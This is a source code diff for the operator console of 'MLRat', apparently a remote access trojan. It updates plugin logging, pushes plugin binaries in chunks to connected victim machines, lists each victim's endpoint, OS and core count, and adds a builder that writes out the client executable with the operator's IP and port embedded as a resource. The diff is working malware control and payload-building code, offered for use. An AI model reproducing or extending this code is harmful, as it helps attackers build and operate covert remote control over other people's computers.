@@ -17,6 +17,7 @@ using System.Threading;
 using MLRat.Handlers;
 using ServerPlugin.InterfaceHandle;
 using System.Runtime.InteropServices;
+using MLRat.Properties;
 
 namespace MLRat.Forms
 {
@@ -42,13 +43,14 @@ namespace MLRat.Forms
 
         void DisplayException(MLPlugin plugin, Exception ex)
         {
-            if (plugin != null)
+            if (plugin != null && plugin.PluginInfomation != null)
             {
-                Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.ToString());
+                rtbPluginLog.LogText(string.Format("[{0}] {1}", plugin.ServerPlugin, ex.Message), Color.Red);
+                //Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.ToString());
             }
             else
             {
-                Console.WriteLine(ex.ToString());
+                rtbPluginLog.LogText(ex.Message, Color.Red);
             }
         }
 
@@ -73,11 +75,23 @@ namespace MLRat.Forms
                 pluginPanel.Controls.Add(_display);
                 LoadedPlugins.Add(_plugin.ClientPluginID, _plugin);
                 Console.WriteLine("Loaded plugin: {0}", _plugin.ClientPluginID.ToString("n"));
-                _plugin.ServerPlugin.OnPluginLoad(new MLUiHost(_plugin, OncontextAdd, OnColumnAdd));
+                _plugin.ServerPlugin.OnPluginLoad(new MLUiHost(_plugin, OncontextAdd, OnColumnAdd, getImage, LogText));
             }
             catch(Exception ex)
             {
                 DisplayException(_plugin, ex);
+            }
+        }
+
+        void LogText(MLPlugin plugin, string text, Color c)
+        {
+            try
+            {
+                rtbPluginLog.LogText(string.Format("[{0}] ", plugin.PluginInfomation.PluginName) + text, c);
+            }
+            catch(Exception ex)
+            {
+                DisplayException(plugin, ex);
             }
         }
 
@@ -136,9 +150,35 @@ namespace MLRat.Forms
             });
         }
 
-        void OncontextAdd(MLPlugin _plugin, MLRatContextEntry entry)
+        Image getImage(string name)
+        {
+            try
+            {
+                string imgPath = Path.Combine("Images", name);
+                if (!File.Exists(imgPath))
+                    return null;
+                return Image.FromFile(imgPath);
+            }
+            catch
+            {
+                return null;
+            }
+        }
+
+        void OncontextAdd(MLPlugin _plugin, MLRatContextEntry[] entry)
+        {
+            foreach(MLRatContextEntry contextentry in entry)
+            {
+                AddSingleContext(_plugin, contextentry);
+            }
+        }
+
+        void AddSingleContext(MLPlugin _plugin, MLRatContextEntry entry)
         {
             ToolStripMenuItem _baseItem = new ToolStripMenuItem();
+            Image toolstripIcon = getImage(entry.Icon);
+            if (toolstripIcon != null)
+                _baseItem.Image = toolstripIcon;
             _baseItem.Text = entry.Text;
             _baseItem.Tag = new MLContextData()
             {
@@ -147,7 +187,7 @@ namespace MLRat.Forms
             };
             if (entry.OnClick != null)
                 _baseItem.Click += ContextMenu_Click;
-            if(entry.SubMenus != null)
+            if (entry.SubMenus != null)
             {
                 foreach (var subentry in entry.SubMenus)
                     AddMenuItem(_plugin, _baseItem, subentry);
@@ -158,6 +198,9 @@ namespace MLRat.Forms
         void AddMenuItem(MLPlugin _plugin, ToolStripMenuItem parent, MLRatContextEntry entry)
         {
             ToolStripMenuItem _menu = new ToolStripMenuItem();
+            Image toolstripIcon = getImage(entry.Icon);
+            if (toolstripIcon != null)
+                _menu.Image = toolstripIcon;
             _menu.Text = entry.Text;
             _menu.Tag = new MLContextData()
             {
@@ -200,7 +243,7 @@ namespace MLRat.Forms
                     this.Invoke((MethodInvoker) delegate()
                     {
                         MLClientData _client = (MLClientData) i.Tag;
-                        _selectedClients.Add(new MLClient(_client.ID, _plugin.ClientPluginID, _client.ClientSocket));
+                        _selectedClients.Add(new MLClient(_client.ID, _plugin.ClientPluginID, _client));
                     });
                 }
                 catch(Exception ex)
@@ -213,6 +256,7 @@ namespace MLRat.Forms
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
+            this.Text += " - " + Application.ProductVersion;
             DirectoryInfo id = new DirectoryInfo("Plugins");
             if (id.Exists)
             {
@@ -226,7 +270,7 @@ namespace MLRat.Forms
         private void button1_Click(object sender, EventArgs e)
         {
             NetworkServer = new eSock.Server();
-            NetworkServer.BufferSize = 8192;//1mb
+            NetworkServer.BufferSize = 8192;
             NetworkServer.OnClientConnect += NetworkServer_OnClientConnect;
             NetworkServer.OnClientConnecting += NetworkServer_OnClientConnecting;
             NetworkServer.OnClientDisconnect += NetworkServer_OnClientDisconnect;
@@ -234,8 +278,7 @@ namespace MLRat.Forms
             if (NetworkServer.Start((int)numericUpDown1.Value))
             {
                 this.Text += ": " + numericUpDown1.Value.ToString();
-                button1.Enabled = false;
-                numericUpDown1.Enabled = false;
+                gbNetwork.Enabled = false;
             }
             else
             {
@@ -262,8 +305,6 @@ namespace MLRat.Forms
                             
                             if (command == NetworkPacket.Handshake)
                             {
-                                string addUsername = (string) data[2];
-                                string OS = (string)data[3];
                                 _ClientData.Handshaken = true;
                                 _ClientData.Encryption.GenerateRandomKey();
                                 client.Send(Guid.Empty, (byte)NetworkPacket.Connect, _ClientData.Encryption.Key);
@@ -282,16 +323,14 @@ namespace MLRat.Forms
                             i.SubItems.Add(client.NetworkSocket.RemoteEndPoint.ToString());
                             i.SubItems.Add(_ClientData.Settings.GetSetting<string>("OS", "WinX Lollypop (Unknowen)"));
                             i.SubItems.Add(_ClientData.Settings.GetSetting<string>("Cores", "0"));
-                            i.SubItems.Add(_ClientData.Settings.GetSetting<string>("Path", ""));
-
                             _ClientData.DisplayObject = i;
+                            
                             AddListview(i);
                             foreach (var plugin in LoadedPlugins)
                             {
                                 try
                                 {
-                                    plugin.Value.ServerPlugin.OnClientConnect(new MLClient(_ClientData.ID, plugin.Value.ClientPluginID,
-                                    client));
+                                    plugin.Value.ServerPlugin.OnClientConnect(new MLClient(_ClientData.ID, plugin.Value.ClientPluginID, _ClientData));
                                 }
                                 catch (Exception ex)
                                 {
@@ -330,6 +369,7 @@ namespace MLRat.Forms
                                 {
                                     Guid ID = plugin.Key;
                                     UpdatePlugin(client, ID);
+                                    Thread.Sleep(100);
                                     Updated = true;
                                 }
                                 return;
@@ -347,6 +387,7 @@ namespace MLRat.Forms
                                 if (LoadedPlugins[ID].ClientPluginChecksum!= checksum)
                                 {
                                     UpdatePlugin(client, ID);
+                                    Thread.Sleep(100);
                                     Updated = true;
                                 }
                                  
@@ -359,6 +400,7 @@ namespace MLRat.Forms
                                 if (!Checksums.ContainsKey(ID))
                                 {
                                     UpdatePlugin(client, ID);
+                                    Thread.Sleep(100);
                                     Updated = true;
                                 }
                             }
@@ -377,7 +419,7 @@ namespace MLRat.Forms
                     if (LoadedPlugins.ContainsKey(PluginID))
                     {
                         LoadedPlugins[PluginID].ServerPlugin.OnDataRetrieved(new MLClient(_ClientData.ID, PluginID,
-                            client), (object[]) data[1]);
+                            _ClientData), (object[]) data[1]);
                     }
                 }
                 catch(Exception ex)
@@ -385,55 +427,6 @@ namespace MLRat.Forms
                     DisplayException(null, ex);
                 }
             }
-        }
-
-        void UpdatePlugin(eSock.Server.eSockClient client, Guid ID)
-        {
-            try
-            {
-                byte[] buffer = new byte[10000];
-                int bytesRead = 0;
-                using (MemoryStream _pluginUpdate = new MemoryStream(LoadedPlugins[ID].ClientPluginBytes))
-                {
-                    while ((bytesRead = _pluginUpdate.Read(buffer, 0, buffer.Length)) > 0)
-                    {
-                        byte[] Packet = new byte[bytesRead];
-                        Array.Copy(buffer, 0, Packet, 0, bytesRead);
-                        client.Send(Guid.Empty, (byte)NetworkPacket.UpdatePlugin, ID, Packet,
-                            _pluginUpdate.Position == _pluginUpdate.Length);
-                        Thread.Sleep(100);
-                    }
-                }
-            }
-            catch(Exception ex)
-            {
-                if (LoadedPlugins.ContainsKey(ID))
-                    DisplayException(LoadedPlugins[ID], ex);
-                else
-                    DisplayException(null, ex);
-            }
-        }
-
-        void AddListview(ListViewItem lv)
-        {
-            this.Invoke((MethodInvoker) delegate()
-            {
-                foreach(ColumnHeader header in clientList.Columns)
-                {
-                    if(lv.SubItems.Count == header.Index)
-                    {
-                        lv.SubItems.Add((string)header.Tag);
-                    }
-                }
-                clientList.Items.Add(lv);
-            });
-        }
-        void RemoveListView(ListViewItem lv)
-        {
-            this.Invoke((MethodInvoker)delegate()
-            {
-                clientList.Items.Remove(lv);
-            });
         }
 
         void NetworkServer_OnClientDisconnect(eSock.Server sender, eSock.Server.eSockClient client, System.Net.Sockets.SocketError ER)
@@ -448,7 +441,7 @@ namespace MLRat.Forms
                 {
                     plugin.Value.ServerPlugin.OnClientDisconnect(new MLClient(_ClientData.ID,
                         plugin.Value.ClientPluginID,
-                        client));
+                        _ClientData));
                 }
                 catch(Exception ex)
                 {
@@ -471,6 +464,55 @@ namespace MLRat.Forms
 
         #endregion
 
+        void UpdatePlugin(eSock.Server.eSockClient client, Guid ID)
+        {
+            try
+            {
+                byte[] buffer = new byte[2000];
+                int bytesRead = 0;
+                using (MemoryStream _pluginUpdate = new MemoryStream(LoadedPlugins[ID].ClientPluginBytes))
+                {
+                    while ((bytesRead = _pluginUpdate.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        byte[] Packet = new byte[bytesRead];
+                        Array.Copy(buffer, 0, Packet, 0, bytesRead);
+                        client.Send(Guid.Empty, (byte)NetworkPacket.UpdatePlugin, ID, Packet,
+                        _pluginUpdate.Position == _pluginUpdate.Length);
+                        Thread.Sleep(100);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                if (LoadedPlugins.ContainsKey(ID))
+                    DisplayException(LoadedPlugins[ID], ex);
+                else
+                    DisplayException(null, ex);
+            }
+        }
+
+        void AddListview(ListViewItem lv)
+        {
+            this.Invoke((MethodInvoker)delegate ()
+            {
+                foreach (ColumnHeader header in clientList.Columns)
+                {
+                    if (lv.SubItems.Count == header.Index)
+                    {
+                        lv.SubItems.Add((string)header.Tag);
+                    }
+                }
+                clientList.Items.Add(lv);
+            });
+        }
+        void RemoveListView(ListViewItem lv)
+        {
+            this.Invoke((MethodInvoker)delegate ()
+            {
+                if (clientList != null)
+                    clientList.Items.Remove(lv);
+            });
+        }
 
         #region " WinApi "
 
@@ -481,7 +523,66 @@ namespace MLRat.Forms
         static extern bool UpdateResource(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, IntPtr lpData, uint cbData);
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool DeleteFile(string path);
 
         #endregion
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            string outputFile = string.Empty;
+            try
+            {
+                using (SaveFileDialog sfd = new SaveFileDialog())
+                {
+                    sfd.Filter = "Exe File|*.exe";
+                    if (sfd.ShowDialog() != DialogResult.OK)
+                        return;
+                    outputFile = sfd.FileName;
+                }
+                File.WriteAllBytes(outputFile, Resources.MLRatClient);
+                IntPtr resourcePointer = BeginUpdateResource(outputFile, false);
+                byte[] resource = null;
+                using (MemoryStream ms = new MemoryStream())
+                using (BinaryWriter br = new BinaryWriter(ms))
+                {
+                    br.Write((int)nudPortBuild.Value);
+                    br.Write(tbIPBuild.Text);
+                    resource = ms.ToArray();
+                }
+                GCHandle handle = GCHandle.Alloc(resource, GCHandleType.Pinned);
+
+                if (!UpdateResource(resourcePointer, "RT_RCDATA", "Settings", 1066, handle.AddrOfPinnedObject(), Convert.ToUInt32(resource.Length)))
+                    throw new Exception();
+                if (!EndUpdateResource(resourcePointer, false))
+                    throw new Exception();
+
+                handle.Free();
+                MessageBox.Show("Built!");
+            }
+            catch
+            {
+                DeleteFile(outputFile);
+                MessageBox.Show("Failed");
+            }
+        }
+    }
+
+    public static class RichTextBoxExtensions
+    {
+        public static void LogText(this RichTextBox box, string text, Color color)
+        {
+            box.Invoke((MethodInvoker)delegate ()
+            {
+                box.SelectionStart = box.TextLength;
+                box.SelectionLength = 0;
+
+                box.SelectionColor = color;
+                box.AppendText(text + "\n");
+                box.SelectionColor = box.ForeColor;
+                box.SelectionStart = box.Text.Length;
+                box.ScrollToCaret();
+            });
+        }
     }
 }
